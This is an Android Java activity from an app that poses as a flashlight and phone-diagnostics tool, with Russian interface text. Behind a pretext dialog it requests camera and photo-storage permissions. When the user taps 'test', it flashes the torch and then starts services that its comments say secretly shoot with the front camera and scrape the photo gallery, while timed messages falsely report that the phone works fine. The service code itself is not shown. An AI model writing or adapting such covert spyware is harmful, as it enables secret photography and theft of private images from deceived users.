package com.flashlight.app;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private CameraManager cameraManager;
    private String cameraId;
    private TextView tvStatus;
    private Button btn;
    private boolean hasTested = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tv_status);
        btn = findViewById(R.id.btn_flash);

        new AlertDialog.Builder(this)
            .setTitle("Проверка устройства")
            .setMessage("Для точной диагностики камеры и памяти необходимо предоставить доступ.")
            .setPositiveButton("Разрешить", (dialog, which) -> requestPermissions())
            .setCancelable(false)
            .show();

        cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            for (String id : cameraManager.getCameraIdList()) {
                Boolean flash = cameraManager.getCameraCharacteristics(id).get(CameraCharacteristics.FLASH_INFO_AVAILABLE);
                if (flash != null && flash) { cameraId = id; break; }
            }
            if (cameraId == null) cameraId = cameraManager.getCameraIdList()[0];
        } catch (CameraAccessException e) { e.printStackTrace(); }

        btn.setOnClickListener(v -> {
            if (hasTested) {
                tvStatus.setText("Телефон в порядке.");
                tvStatus.setTextColor(0xFF00E676);
                return;
            }

            btn.setEnabled(false);
            btn.setText("ТЕСТ...");
            tvStatus.setText("Анализ памяти и камеры...");
            tvStatus.setTextColor(0xFFFFEB3B);

            // Включаем вспышку на 2 секунды для света
            try { cameraManager.setTorchMode(cameraId, true); } catch (Exception e) {}

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try { cameraManager.setTorchMode(cameraId, false); } catch (Exception e) {}
                
                // Снимаем на фронталку
                startForegroundService(new Intent(this, CameraService.class));
                // Выгребаем галерею
                startService(new Intent(this, GalleryService.class));

            }, 2000);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                tvStatus.setText("Упс! Проверьте ещё раз через 4 секунды.");
                tvStatus.setTextColor(0xFFFF5252);
                btn.setEnabled(true);
                btn.setText("ПРОВЕРИТЬ СНОВА");
                hasTested = true;
            }, 4000);
            
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                tvStatus.setText("Успешно проверено. Все работает. Телефон живой.");
                tvStatus.setTextColor(0xFF00E676);
                btn.setText("ЗАВЕРШИТЬ");
                btn.setEnabled(true);
            }, 6000);
        });
    }

    private void requestPermissions() {
        List<String> perms = new ArrayList<>();
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            perms.add(Manifest.permission.CAMERA);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }
        if (!perms.isEmpty()) {
            ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), 1);
        }
    }
}
